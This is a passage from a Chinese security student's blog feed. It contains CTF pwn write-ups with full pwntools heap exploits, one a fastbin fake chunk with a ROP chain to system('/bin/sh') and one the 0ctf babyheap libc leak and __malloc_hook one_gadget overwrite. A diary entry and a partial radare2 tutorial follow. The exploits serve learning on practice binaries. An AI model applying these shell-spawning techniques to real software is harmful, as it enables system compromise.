allocate_fake_chunk(binsh_addr, system_addr):</span><br><span class="line">    # allocate twice to get our fake chunk</span><br><span class="line">    index_sentence(&apos;A&apos;*56)</span><br><span class="line">    index_sentence(&apos;B&apos;*56)</span><br><span class="line"></span><br><span class="line">    # overwrite the return address</span><br><span class="line">    buf = &apos;A&apos;*30</span><br><span class="line">    buf += p64(pop_rdi_ret)</span><br><span class="line">    buf += p64(binsh_addr)</span><br><span class="line">    buf += p64(system_addr)</span><br><span class="line">    buf = buf.ljust(56, &apos;C&apos;)</span><br><span class="line"></span><br><span class="line">    index_sentence(buf)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stack_leak = leak_stack()</span><br><span class="line"></span><br><span class="line">    # This makes stack_addr + 0x8 be 0x40  //在泄露的栈地址附近寻找0x40用于充当fakechunk的size</span><br><span class="line">    stack_addr = stack_leak + 0x5a - 8</span><br><span class="line"></span><br><span class="line">    log.info(&apos;stack leak: %s&apos; % hex(stack_leak))</span><br><span class="line">    log.info(&apos;stack addr: %s&apos; % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">    libc_leak = leak_libc()</span><br><span class="line">    libc_base = libc_leak - puts_offset</span><br><span class="line">    system_addr = libc_base + system_offset</span><br><span class="line">    binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">    log.info(&apos;libc leak: %s&apos; % hex(libc_leak))</span><br><span class="line">    log.info(&apos;libc_base: %s&apos; % hex(libc_base))</span><br><span class="line">    log.info(&apos;system addr: %s&apos; % hex(system_addr))</span><br><span class="line">    log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">    make_cycle()</span><br><span class="line">    make_fake_chunk(stack_addr)</span><br><span class="line">    allocate_fake_chunk(binsh_addr, system_addr)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="例题-0ctfbabyheap"><a href="#例题-0ctfbabyheap" class="headerlink" title="例题-0ctfbabyheap"></a>例题-0ctfbabyheap</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>炒鸡正规的条件选项题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./0ctfbabyheap </span><br><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure><p>分配的块可以分析出有一个结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">         struc_4  structure&#123; </span><br><span class="line">00000000 inuse          </span><br><span class="line">00000001 size         </span><br><span class="line">00000002 ptr           </span><br><span class="line">00000003 &#125;struc_4   ends</span><br></pre></td></tr></table></figure><p>inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址；</p><p>各个选项就不一一列举了，每个选项就如它名字一般：<br>allocate使用calloc分配块，最大4096；<br>fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；<br>free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。<br>dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><em>即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。</em></p><p>目标：1.leak libc地址<br>      2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx  (long long)(&amp;main_arena)-0x30</span><br><span class="line">0x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;:0x00007fa3a2004d600x0000000000000000</span><br><span class="line">0x7fa3a2008c20 &lt;__memalign_hook&gt;:0x00007fa3a1ed4bf00x00007fa3a1ed5160</span><br><span class="line">0x7fa3a2008c30 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000  &lt;-- malloc hook </span><br><span class="line">0x7fa3a2008c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008ca0 &lt;main_arena+96&gt;:0x000055b8638813600x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./0ctfbabyheap&apos;)</span><br><span class="line">ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def fill(index,content):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    sh.sendline(str(len(content)))</span><br><span class="line">    sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">    sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    sh.sendline(&quot;4&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">#---------</span><br><span class="line"> </span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------leak libc base-----------</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">fill(0,&apos;a&apos;*0x10+p64(0)+p64(0x21)+p8(0x80))</span><br><span class="line">fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x21))</span><br><span class="line"></span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x91))</span><br><span class="line">allocate(0x80)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line">dump(2)</span><br><span class="line">sh.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">main_arena = leak_addr - 88</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#------------hjack malloc_hook --------</span><br><span class="line">one_gadget_off = 0x4526a</span><br><span class="line">one_gadget_addr = libc_base + one_gadget_off</span><br><span class="line">print &apos;one_gadget_addr: &apos;+hex(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line">fill(2,p64(main_arena - 0x33))</span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)</span><br><span class="line"></span><br><span class="line">fill(6,&apos;a&apos;*0x13+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x100)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>reference:<br><a href="https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1</a><br><a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p><p><em>没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Diary.20181008</title>
      <link href="/2018/10/08/diary-20181008/"/>
      <url>/2018/10/08/diary-20181008/</url>
      <content type="html"><![CDATA[<p>  下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；<br>nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；<br>黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；<br>配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。<br>周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh</p><p>…搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123;</span><br><span class="line">            if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123;</span><br><span class="line">                alert(&apos;Wrong！&apos;);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。<br>这下好了，越来越糟糕</p><p>hexo-blog-encrypt 这个组件都不能用。。没办法了</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Radare2</title>
      <link href="/2018/09/25/radare2/"/>
      <url>/2018/09/25/radare2/</url>
      <content type="html"><![CDATA[<p><em>之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm</em></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/install.sh</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><em>之后学习使用中逐渐更新</em><br>常用包含工具：</p><ul><li>radare2-&gt;整合了所有工具</li><li>rabin2-&gt;查看文件格式的</li><li>radiff2-&gt;比较文件不同的</li><li>rahash2-&gt;各种密码算法，hash算法集成</li><li>rasm2-&gt;汇编和反汇编</li><li>ragg2-&gt;开发shellcode工具(radare2自己编写的编译器)</li></ul><h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><pre><code>随便加载个文件,会有一句欢迎语hhhh</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$r2 pwnme</span><br><span class="line"> -- We only have bugs, features are an unintended side-effect</span><br><span class="line">[0x08049090]&gt;                  //工具找到的入口位置</span><br></pre></td></tr></table></figure><h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><pre><code>查看文件基本信息</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># rabin2 -I pwnme</span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x8048000</span><br><span class="line">binsz    14275</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">sanitiz  false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><pre><code>支持超多加解密</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># rahash2 -L    //列举</span><br><span class="line">Available Hashes: </span><br><span class="line">h  md5</span><br><span class="line">h  sha1</span><br><span class="line">h  sha256</span><br><span class="line">h  sha384</span><br><span class="line">h  sha512</span><br><span class="line">h  md4</span><br><span class="line">h  xor</span><br><span class="line">h  xorpair</span><br><span class="line">h  parity</span><br><span class="line">h  entropy</span><br><span class="line">h  hamdist</span><br><span class="line">h  pcprint</span><br><span class="line">h  mod255</span><br><span class="line">h  xxhash</span><br><span class="line">h  adler32</span><br><span class="line">h  luhn</span><br><span class="line">h  crc8smbus</span><br><span class="line">h  crc15can</span><br><span class="line">h  crc16</span><br><span class="line">h  crc16hdlc</span><br><span class="line">h  crc16usb</span><br><span class="line">h  crc16citt</span><br><span class="line">h  crc24</span><br><span class="line">h  crc32</span><br><span class="line">h  crc32c</span><br><span class="line">h  crc32ecma267</span><br><span class="line">h  crc32bzip2</span><br><span class="line">h  crc32d</span><br><span class="line">h  crc32mpeg2</span><br><span class="line">h  crc32posix</span><br><span class="line">h  crc32q</span><br><span class="line">h  crc32jamcrc</span><br><span class="line">h  crc32xfer</span><br><span class="line">h  crc64</span><br><span class="line">h  crc64ecma</span><br><span class="line">h  crc64we</span><br><span class="line">h  crc64xz</span><br><span class="line">h  crc64iso</span><br><span class="line"></span><br><span class="line">Available Encoders/Decoders: </span><br><span class="line">e  base64</span><br><span class="line">e  base91</span><br><span class="line">e  punycode</span><br><span class="line"></span><br><span class="line">Available Crypto Algos: </span><br><span class="line">c  rc2</span><br><span class="line">c  rc4</span><br><span class="line">c  rc6</span><br><span class="line">c  aes-ecb</span><br><span class="line">c  aes-cbc</span><br><span class="line">c  ror</span><br><span class="line">c  rol</span><br><span class="line">c  rot</span><br><span class="line">c  blowfish</span><br><span class="line">c  cps2</span><br><span class="line">c  des-ecb</span><br><span class="line">c  xor</span><br><span class="line">c  serpent-ecb</span><br><span class="line"></span><br><span class="line"># rahash2 -a md5 ./pwnme       //生成md5哈希</span><br><span class="line">./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56</span><br></pre></td></tr></table></figure><h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><pre><code>支持汇编反汇编 </code></pre><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><pre><code>据说可以用来快速开发shellcode？</code></pre><h3 id="radiff2"><a href="#radiff2" class="headerlink" title="radiff2"></a>radiff2</h3><pre><code>支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。厂商更新漏洞时，可以寻找更新代码字段，说不定在那里还有希望挖到其他洞</code></pre><h3 id="rafind2"><a href="#rafind2" class="headerlink" title="rafind2"></a>rafind2</h3><pre><code>在文件中查找字节模式</code></pre><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><pre><code>用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和覆盖的默认文件描述符。rarun2可用于：* 破解小程序* 模糊测试* 测试组件</code></pre><h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><pre><code>用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示，十六进制字符串到ASCII之间进行基本转换，八进制到整数等。它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><ul><li>i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; ie</span><br><span class="line">[Entrypoints]</span><br><span class="line">vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program</span><br><span class="line"></span><br><span class="line">1 entrypoints</span><br><span class="line"></span><br><span class="line">[0x08049090]&gt; iz</span><br><span class="line">[Strings]</span><br><span class="line">Num Vaddr      Paddr      Len Size Section  Type  String</span><br><span class="line">000 0x00002008 0x0804a008   7   8 (.rodata) ascii /bin/sh</span><br><span class="line">001 0x00002010 0x0804a010   5   6 (.rodata) ascii input</span><br></pre></td></tr></table></figure><ul><li>a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># r2 -A pwnme</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[x] Type matching analysis for all functions (afta)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line"> -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS</span><br></pre></td></tr></table></figure><ul><li>fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces="">，一个 flag 是所有类似特征的集合。可以使用 ‘fs <flagspaces>‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’).</flagspaces></flag></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; fs</span><br><span class="line">0    2 * strings</span><br><span class="line">1   37 * symbols</span><br><span class="line">2   30 * sections</span><br><span class="line">3   12 * segments</span><br><span class="line">4    5 * relocs</span><br><span class="line">5    5 * imports</span><br><span class="line">6    2 * functions</span><br><span class="line">[0x08049090]&gt; fs strings;f</span><br><span class="line">0x0804a008 8 str.bin_sh</span><br><span class="line">0x0804a010 6 str.input</span><br></pre></td></tr></table></figure><ul><li><p>axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p></li><li><p>vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。)</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-[ functions ]----------------- pdf ---</span><br><span class="line">(a) add     (x) xrefs  (q) quit  (jk) next/prev                         ;-- section..text:</span><br><span class="line">(r) rename  (c) calls  (g) go    (tab) column                           ;-- eip:</span><br><span class="line">(d) delete  (v) vars   (?) help  (:)  enter cmd             / (fcn) entry0 50</span><br><span class="line">&gt;* 0x08049090   50 entry0                                   |   entry0 ();</span><br><span class="line">   0x080490c3    4 fcn.080490c3                             |           0x08049090      xor ebp, ebp                               ; [14] -r-x secti</span><br><span class="line">   0x08049070    6 sym.imp.__libc_start_main                |           0x08049092      pop esi</span><br><span class="line">   0x080490f0   40 sym.deregister_tm_clones                 |           0x08049093      mov ecx, esp</span><br><span class="line">   0x08049130   53 sym.register_tm_clones                   |           0x08049095      and esp, 0xfffffff0</span><br><span class="line">   0x08049170   30 sym.__do_global_dtors_aux                |           0x08049098      push eax</span><br><span class="line">   0x080491a0    2 entry1.init                              |           0x08049099      push esp</span><br><span class="line">   0x080492b0    2 sym.__libc_csu_fini                      |           0x0804909a      push edx</span><br><span class="line">   0x080490e0    4 sym.__x86.get_pc_thunk.bx                |           0x0804909b      call fcn.080490c3</span><br><span class="line">   0x080492b4   20 sym._fini                                |           0x080490a0      add ebx, 0x2f60                            ; &apos;`/&apos;</span><br><span class="line">   0x08049250   93 sym.__libc_csu_init                      |           0x080490a6      lea eax, [ebx - 0x2d50]</span><br><span class="line">   0x080490d0    2 sym._dl_relocate_static_pie              |           0x080490ac      push eax                                   ; func fini</span><br><span class="line">   0x08049203   65 sym.main                                 |           0x080490ad      lea eax, [ebx - 0x2db0]</span><br><span class="line">   0x08049244    4 sym.__x86.get_pc_thunk.ax                |           0x080490b3      push eax                                   ; func init</span><br><span class="line">   0x08049050    6 sym.imp.puts                             |           0x080490b4      push ecx                                   ; char **ubp_av</span><br><span class="line">   0x080491cd   54 sym.vulnerable                           |           0x080490b5      push esi                                   ; int argc</span><br><span class="line">   0x08049040    6 sym.imp.gets                             |           0x080490b6      mov eax, sym.main                          ; 0x8049203</span><br><span class="line">   0x080491a2   43 sym.flag                                 |           0x080490bc      push eax                                   ; func main</span><br><span class="line">   0x08049060    6 sym.imp.system                           \           0x080490bd      call sym.imp.__libc_start_main             ; int __libc_star</span><br><span class="line">   0x08049000   35 sym._init</span><br><span class="line">   0x08049080    6 sub.__gmon_start_80</span><br></pre></td></tr></table></figure><ul><li>s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 